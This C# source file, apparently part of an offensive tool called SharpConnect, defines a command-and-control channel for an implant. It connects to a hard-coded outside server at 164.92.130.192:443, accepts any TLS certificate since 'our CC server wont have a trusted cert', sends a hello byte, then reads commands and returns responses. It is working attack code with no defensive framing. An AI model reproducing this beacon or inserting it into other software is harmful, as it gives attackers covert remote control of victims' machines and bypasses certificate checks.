using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;

namespace SharpConnect
{
    class CommChannel
    {
        private string ccAddress = "164.92.130.192";
        private int ccPort = 443;

        private Socket ccSocket = null;
        private bool usingTLS = true;

        private NetworkStream unencryptedStream;
        private SslStream encryptedStream;

        public CommChannel(bool useTLS = true)
        {
            usingTLS = useTLS;
        }

        private static bool ValidateServerCertificate(object sender,
              X509Certificate certificate,
              X509Chain chain,
              SslPolicyErrors sslPolicyErrors)
        {
            // Always accept. Our CC server wont have a trusted cert anyway
            return true;
        }
        public bool Connect()
        {
            byte[] helloPacket = Encoding.ASCII.GetBytes("?");

            try
            {
                IPEndPoint ccEndpoint = new IPEndPoint(IPAddress.Parse(ccAddress), ccPort);

                TcpClient client = new TcpClient(ccAddress, ccPort);

                if (usingTLS) {
                    encryptedStream = new SslStream(
                        client.GetStream(),
                        true,
                        new RemoteCertificateValidationCallback(ValidateServerCertificate),
                        null
                       );

                    encryptedStream.AuthenticateAsClient("");
                    encryptedStream.Write(helloPacket);
                    encryptedStream.Flush();

                }
                else
                {
                    unencryptedStream = client.GetStream();
                    unencryptedStream.Write(helloPacket, 0, helloPacket.Length);
                    unencryptedStream.Flush();
                }

                return true;
            }
            catch
            {
                return false;
            }
        }

        public string receiveCommand()
        {
            try
            {
                byte[] buffer = new byte[2048];

                if(usingTLS)
                {
                    encryptedStream.Read(buffer, 0, buffer.Length);
                }
                else
                {
                    unencryptedStream.Read(buffer, 0, buffer.Length);
                } 

                string message = Encoding.ASCII.GetString(buffer);

                return message;
            }
            catch
            {
                return null;
            }
        }

        public bool respondWith(string answer)
        {
            try
            {
                byte[] message = Encoding.ASCII.GetBytes(answer);

                if(usingTLS)
                {
                    encryptedStream.Write(message, 0, message.Length);
                    encryptedStream.Flush();
                }
                else
                {
                    unencryptedStream.Write(message, 0, message.Length);
                    unencryptedStream.Flush();
                }

                return true;
            }
            catch
            {
                return false;
            }
        }
        
    

       

       
           

            
    }
}
